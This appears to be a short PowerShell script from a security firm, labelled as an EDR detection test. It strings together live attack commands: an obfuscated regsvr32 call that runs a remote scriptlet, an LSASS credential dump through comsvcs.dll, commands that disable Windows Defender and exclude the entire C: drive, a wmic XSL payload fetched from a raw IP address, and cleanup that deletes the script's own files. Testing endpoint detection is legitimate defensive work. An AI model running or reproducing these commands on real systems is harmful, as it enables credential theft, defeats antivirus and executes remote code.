#Encabezado
#Hecho por: Julio Castro - Tecnova Soluciones
#Para: Test EDR
#Fecha: 12/06/2023 - 13:00
#1
powershell  -w 1 -e QzpcV2luZG93c1xzeXN0ZW0zMlxyZWdzdnIzMi5leGUgL3MgL24gL3UgL2k6aHR0cDovL3NpbXVsYXRpb24uZG9tYWluL2ZpbGUuc2N0IHNjcm9iai5kbGwK;
#2
powershell  -w 1 -e C:\\Windows\\system32\\regsvr32.exe /s /n /u /i:http://simulation.domain/file.sct scrobj.dll\n;
#3
powershell.exe -ExecutionPolicy Bypass -C \"C:\\Windows\\System32\\rundll32.exe C:\\windows\\System32\\comsvcs.dll, MiniDump (Get-Process lsass).id $env:TEMP\\lsass-comsvcs.dmp full\;
#4
cmd  /c powershell Set-MpPreference -DisableRealtimeMonitoring 1;Add-MpPreference -ExclusionPath c:\\;Add-MpPreference -ExclusionProcess c:\\windows\\system32\\WindowsPowerShell\\v1.0\\powershell.exe;
#5
wmic os get /FORMAT:\"http://172.83.155.170:8170/s.xsl;
Start-Sleep -Seconds 10;
#6
Remove-Item -Path "C:\Tecnova\2Tecnova-JulioC-TestEDR.ps1" -Force;
Start-Sleep -Seconds 3;
#7
Remove-Item -Path "C:\Tecnova\1Tecnova-JulioC-TestEDR.bat" -Force
